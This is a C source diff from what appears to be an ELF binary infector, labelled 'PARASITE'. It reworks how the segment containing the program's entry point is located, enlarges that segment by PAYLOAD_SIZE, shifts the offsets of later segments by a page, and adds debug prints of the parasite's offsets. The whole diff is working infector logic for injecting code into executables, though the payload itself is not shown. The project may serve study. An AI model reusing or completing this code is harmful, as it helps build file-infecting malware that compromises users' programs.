@@ -21,11 +21,11 @@ static inline void modify_segment(Elf64_Phdr *segment)
 	segment->p_offset += PAGE_SIZE;
 }
 
-static inline bool is_text_segment(Elf64_Phdr const *segment)
+static inline bool is_entrypoint_segment(Elf64_Ehdr const *header, Elf64_Phdr const *segment)
 {
-	if (segment->p_type != PT_LOAD)
+	if (header->e_entry < segment->p_vaddr)
 		return false;
-	if ((segment->p_flags & PF_X) == false)
+	if (header->e_entry > segment->p_vaddr + segment->p_filesz)
 		return false;
 
 	return true;
@@ -33,13 +33,12 @@ static inline bool is_text_segment(Elf64_Phdr const *segment)
 
 static inline void modify_elf(t_elf *elf, Elf64_Phdr const *segment)
 {
-	elf->old_offset = segment->p_offset;
-	elf->new_offset = segment->p_offset + segment->p_filesz;
-
-	elf->new_entry = segment->p_vaddr + segment->p_filesz;
+	elf->segment_offset = segment->p_offset;
+	elf->segment_addr = segment->p_vaddr;
+	elf->segment_size = segment->p_filesz;
 }
 
-static inline void modify_text_segment(Elf64_Phdr *segment)
+static inline void modify_entrypoint_segment(Elf64_Phdr *segment)
 {
 	segment->p_filesz += PAYLOAD_SIZE;
 	segment->p_memsz += PAYLOAD_SIZE;
@@ -63,10 +62,12 @@ void modify_segments(t_elf *elf)
 		if (corrupt == true)
 			modify_segment(segment);
 
-		if (is_text_segment(segment) == true)
+		if (is_entrypoint_segment(header, segment) == true)
 		{
+			printf("PARASITE beg segment at offset: %lx\n", segment->p_offset); // DEBUG
+			printf("PARASITE eng segment at offset: %lx\n", segment->p_offset + segment->p_filesz); // DEBUG
 			modify_elf(elf, segment);
-			modify_text_segment(segment);
+			modify_entrypoint_segment(segment);
 
 			corrupt = true;
 		}
